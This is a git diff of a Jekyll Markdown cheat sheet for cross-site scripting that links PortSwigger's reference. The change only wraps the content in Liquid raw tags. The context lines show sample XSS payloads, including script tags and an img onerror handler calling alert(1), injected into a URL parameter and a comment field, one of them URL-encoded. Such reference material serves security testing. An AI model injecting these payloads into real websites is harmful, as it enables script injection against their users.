@@ -4,8 +4,9 @@ desc: Cheet Sheet for Cross Site Scripting.
 tags: [Web, XSS]
 alts: []
 website: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-render_with_liquid: false
 ---
+
+{% raw %}
 
 ```html
 https://example.com/item?id=<script>alert(1)</script>
@@ -31,3 +32,5 @@ postId=2&comment=<script>alert(1)</script>
 postId=2&comment=<><img src=1 onerror=alert(1)>
 postId=2&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
 ```
+
+{% endraw %}
